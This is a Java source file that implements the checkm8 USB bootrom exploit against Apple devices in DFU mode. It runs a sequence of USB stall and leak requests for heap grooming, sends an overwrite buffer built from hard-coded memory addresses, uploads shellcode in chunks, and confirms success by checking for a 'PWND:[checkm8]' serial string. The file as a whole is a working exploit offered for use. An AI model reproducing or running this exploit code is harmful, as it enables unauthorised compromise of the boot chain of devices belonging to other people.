package queen.exploit;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.concurrent.TimeUnit;

import queen.device.DeviceConfig;
import queen.device.ExploitConfig;
import queen.dfu.Dfu;
import queen.dfu.EventHandlingThread;

public class Exploit {
    public static void runCheckm8() {
        Dfu dfu = new Dfu();

        // For async io
        EventHandlingThread asyncIOThread = new EventHandlingThread();
        asyncIOThread.start();

        DeviceConfig deviceConfig = new DeviceConfig(
                "iBoot-3332.0.0.1.23",
                0x8015,
                0,
                ByteBuffer.allocate(0).array(),
                0x500L,
                6,
                1
        );
        ExploitConfig exploitConfig = new ExploitConfig(deviceConfig);

        try {
            byte[] shellcode = exploitConfig.payload();

            dfu.aquireDevice();

            if (deviceConfig.getLargeLeak() > 0) {
                dfu.usbReqStall();
                for (int i = 0; i < deviceConfig.getLargeLeak(); i++) {
                    dfu.usbReqLeak();
                }
                dfu.usbReqNoLeak();
            } else {
                dfu.stall();

                for (int i = 0; i < deviceConfig.getHole(); i++) {
                    dfu.noLeak();
                }
                dfu.usbReqLeak();
                dfu.noLeak();
            }

            dfu.resetDevice();
            dfu.releaseDevice();

            dfu.aquireDevice();
            ByteBuffer bigBuffer = ByteBuffer.allocateDirect(0x800);
            dfu.asyncCtrlTransfer((byte)0x21, (byte)1, (short)0, (short)0, bigBuffer, Double.doubleToLongBits(0.0001));
            ByteBuffer zeroBuffer = ByteBuffer.allocateDirect(0);
            dfu.noErrorCtrlTransfer((byte)0x21, (byte)4, (short)0, (short)0, zeroBuffer, 0l);
            dfu.releaseDevice();

            TimeUnit.MILLISECONDS.sleep(500l);

            dfu.aquireDevice();
            dfu.usbReqStall();

            if (deviceConfig.getLargeLeak() > 0) {
                dfu.usbReqLeak();
            } else {
                for(int i = 0; i < deviceConfig.getLeak(); i++) {
                    dfu.usbReqLeak();
                }
            }
            ByteBuffer ovBuffer = ByteBuffer.allocateDirect(256);
            ovBuffer.put(exploitConfig.createOverwrite(0x10000A9C4l, 0x18001C020l));
            dfu.noErrorCtrlTransfer((byte)0, (byte)0, (short)0, (short)0, ovBuffer, 100l);

            ByteBuffer shellBuffer = ByteBuffer.allocateDirect(0xc00);
            shellBuffer.put(shellcode);
            for (int i = 0; i < shellcode.length; i += 0x800) {
                ByteBuffer tempBuffer = ByteBuffer.allocateDirect(0xc00);
                byte[] temp = new byte[0x800];
                shellBuffer.get(temp, i, 0x800);
                tempBuffer.put(temp);
                dfu.noErrorCtrlTransfer((byte)0x21, (byte)1, (short)0, (short)0, tempBuffer, 100l);
            }
            dfu.resetDevice();
            dfu.releaseDevice();

            dfu.aquireDevice();
            if (!dfu.getSerial().contains("PWND:[checkm8]")) {
                System.out.println("Exploit failed");
                System.exit(-1);
            }
        } catch (InterruptedException e) {
            System.out.println(e.getLocalizedMessage());
            e.printStackTrace();
        } catch (IOException e) {
            System.out.println(e.getLocalizedMessage());
            e.printStackTrace();
        } finally {
            asyncIOThread.abort();
            try {
                asyncIOThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
             dfu.releaseDevice();
        }
    }
}
